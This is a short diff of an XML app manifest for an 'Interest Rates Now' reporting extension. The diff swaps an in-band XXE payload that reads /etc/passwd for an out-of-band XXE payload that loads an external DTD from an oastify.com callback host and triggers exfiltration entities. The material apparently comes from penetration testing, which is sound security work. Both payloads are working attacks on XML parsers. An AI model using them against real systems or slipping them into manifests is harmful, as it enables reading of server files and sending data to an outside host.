@@ -1,9 +1,15 @@
-<!DOCTYPE test [<!ENTITY xxe PUBLIC "file" "file:///etc/passwd">]>
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE oob [
+<!ENTITY % base SYSTEM "http://rvqbo4unzcvxkhnylypjldhyhpngb73vs.oastify.com/external.dtd"> 
+%base;
+%external;
+%exfil;
+]>
 <app>
      <id>gj8dl19d0</id>
      <name>Interest Rates Now</name>
      <provider>Interest Rater</provider>
-     <description>&xxe;</description>
+     <description>blah</description>
      <extensionpoint>
           <location>REPORTING_VIEW</location>
           <label>label</label>
